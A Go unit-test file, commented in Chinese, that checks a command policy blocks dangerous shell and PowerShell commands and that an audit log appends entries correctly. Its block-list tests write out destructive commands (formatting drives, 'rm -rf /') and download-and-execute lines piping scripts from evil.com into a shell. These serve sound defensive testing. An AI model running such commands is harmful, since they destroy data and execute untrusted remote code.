package main

import (
	"path/filepath"
	"strings"
	"testing"
)

// TestCommandPolicyBlocksDangerous 验证 S4 修复：高危命令被拦截。
func TestCommandPolicyBlocksDangerous(t *testing.T) {
	p := DefaultCommandPolicy()

	dangerous := []string{
		`Format-Volume -DriveLetter C`,
		`Stop-Computer -Force`,
		`Remove-Item -Recurse -Force C:\Users`,
		`Invoke-WebRequest http://evil.com/p.ps1 | Invoke-Expression`,
		`rm -rf /`,
		`curl http://evil.com/s.sh | sh`,
	}
	for _, cmd := range dangerous {
		if err := p.Check(cmd); err == nil {
			t.Errorf("高危命令应被拦截: %s", cmd)
		}
	}
}

// TestCommandPolicyAllowsSafe 验证正常命令不被误拦。
func TestCommandPolicyAllowsSafe(t *testing.T) {
	p := DefaultCommandPolicy()

	safe := []string{
		`Get-Process`,
		`Write-Output "hello"`,
		`Get-Service | Where-Object {$_.Status -eq "Running"}`,
		`echo hello`,
		`ls -la /tmp`,
	}
	for _, cmd := range safe {
		if err := p.Check(cmd); err != nil {
			t.Errorf("正常命令不应被拦截: %s（%v）", cmd, err)
		}
	}
}

// TestCommandPolicyCheckPayload 验证按任务类型校验载荷。
func TestCommandPolicyCheckPayload(t *testing.T) {
	p := DefaultCommandPolicy()

	// powershell 高危载荷
	psPayload := []byte(`{"command":"Format-Volume -DriveLetter D"}`)
	if err := p.CheckPayload("powershell", psPayload); err == nil {
		t.Error("powershell 高危载荷应被拦截")
	}

	// script 高危载荷
	scriptPayload := []byte(`{"lang":"ps1","content":"Stop-Computer"}`)
	if err := p.CheckPayload("script", scriptPayload); err == nil {
		t.Error("script 高危载荷应被拦截")
	}

	// 截图任务不校验
	if err := p.CheckPayload("screenshot", []byte(`{}`)); err != nil {
		t.Errorf("screenshot 不应校验命令: %v", err)
	}
}

// TestAuditLogAppend 验证审计日志追加写入。
func TestAuditLogAppend(t *testing.T) {
	dir := t.TempDir()
	a, err := OpenAuditLog(filepath.Join(dir, "audit.log"))
	if err != nil {
		t.Fatalf("OpenAuditLog 失败: %v", err)
	}

	// 写两条
	a.Log(AuditEntry{Event: "task_submitted", TaskID: "t1", AgentID: "a1", Type: "powershell"})
	a.Log(AuditEntry{Event: "task_result", TaskID: "t1", AgentID: "a1"})
	a.Close()

	// 读回验证（JSON Lines）
	data, _ := readFile(filepath.Join(dir, "audit.log"))
	lines := strings.Split(strings.TrimSpace(string(data)), "\n")
	if len(lines) != 2 {
		t.Fatalf("应有 2 行审计记录，有 %d", len(lines))
	}
	if !strings.Contains(lines[0], "task_submitted") || !strings.Contains(lines[0], "t1") {
		t.Fatalf("第一行应含 task_submitted/t1: %s", lines[0])
	}
	if !strings.Contains(lines[1], "task_result") {
		t.Fatalf("第二行应含 task_result: %s", lines[1])
	}
}
